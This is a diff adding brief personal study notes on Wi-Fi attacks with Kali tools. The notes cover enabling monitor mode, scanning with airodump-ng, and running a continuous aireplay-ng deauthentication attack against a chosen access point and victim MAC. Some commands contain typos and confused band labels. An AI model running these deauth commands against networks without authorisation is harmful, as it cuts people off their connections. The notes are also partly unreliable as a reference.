@@ -1,0 +1,19 @@
+test: iwconfig on kali
+
+to enable monitor mode
+  manual:
+    ifconfig wlan0 down
+    iwconfig wlan0 mode monotor
+    ifconfig wlan0 up
+    iwconfig
+  airmon-ng:
+    airmon-ng start wlan0
+    iwconfig
+
+airodump-ng wlan0
+
+airodump-ng --band abg wlan0mon // g for 5GHz where a and b for 2.4GHz // pause using space
+defauthentication attack: attacker disconnects the router from the client and disconnects the client from the router
+I select certain access point using tab, and color it using letter (maybe m)
+airodump-ng --band abg -c 5 --bssid 04:.... wlan0
+aireplay-ng --deauth 0 -a 04:5E... -c (victim mac) wlan0
